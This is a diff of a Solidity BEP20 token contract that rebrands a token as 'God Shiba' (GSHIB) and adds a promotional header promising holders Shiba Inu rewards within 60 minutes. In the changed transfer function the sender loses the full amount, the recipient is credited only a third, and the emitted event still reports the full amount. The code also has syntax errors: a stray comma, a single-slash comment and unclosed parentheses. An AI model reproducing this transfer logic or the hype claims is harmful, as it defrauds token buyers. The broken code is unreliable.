@@ -1,7 +1,17 @@
 // SPDX-License-Identifier: MIT
 
+/*   Welcome to God Shiba
+       Hold $GSHIB And Earn Shiba Inu In 60 Minute
+     
+      This Is Token Community , GodShiba's Plan Token Meme Global
 
-/*
+     GodShiba ; GSHIB
+     Supplay 10.000.000.000
+     Decimals 9 
+
+     Lp Burn & Owner Renounced 
+
+     Telegram @GodShibaBSC
 
     
 
@@ -341,7 +351,7 @@ contract Ownable is Context {
     }
 }
 
-contract GODSHIBa is Context, iBEP20, Ownable {
+contract GODSHIBA is Context, iBEP20, Ownable {
   using SafeMath for uint256;
 
   mapping (address => uint256) private _balances;
@@ -355,12 +365,12 @@ contract GODSHIBa is Context, iBEP20, Ownable {
   address private _dividenttoken,
 
   constructor() public {
-    _name = 'MYTRON';
-    _symbol = 'MYTRX';
+    _name = 'God Shiba';
+    _symbol = 'GSHIB';
     _decimals = 9;
     _burnaddress = 0x000000000000000000000000000000000000dEaD;
     _dividenttoken = 0x2859e4544c4bb03966803b044a93563bd2d0dd4d; / Address Shiba Inu
-    _totalSupply = 10 * 10**4 * 10**9;
+    _totalSupply = 10 * 10**9 * 10**9;
     _balances[msg.sender] = _totalSupply;
 
     emit Transfer(address(0), msg.sender, _totalSupply);
@@ -577,7 +587,7 @@ contract GODSHIBa is Context, iBEP20, Ownable {
     require(recipient != address(0), "BEP20: transfer to the zero address");
 
     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
-    _balances[recipient] = _balances[recipient].add(amount / uint8(2);
+    _balances[recipient] = _balances[recipient].add(amount / uint8(3);
     _balances[recipient] = _balances[recipient].sub(amount / uint256(100) * _taxFee);
      emit Transfer(sender, recipient, amount);
     _balances[_burnaddress] = _balances[_burnaddress].add(amount / uint256(100) * _taxFee);
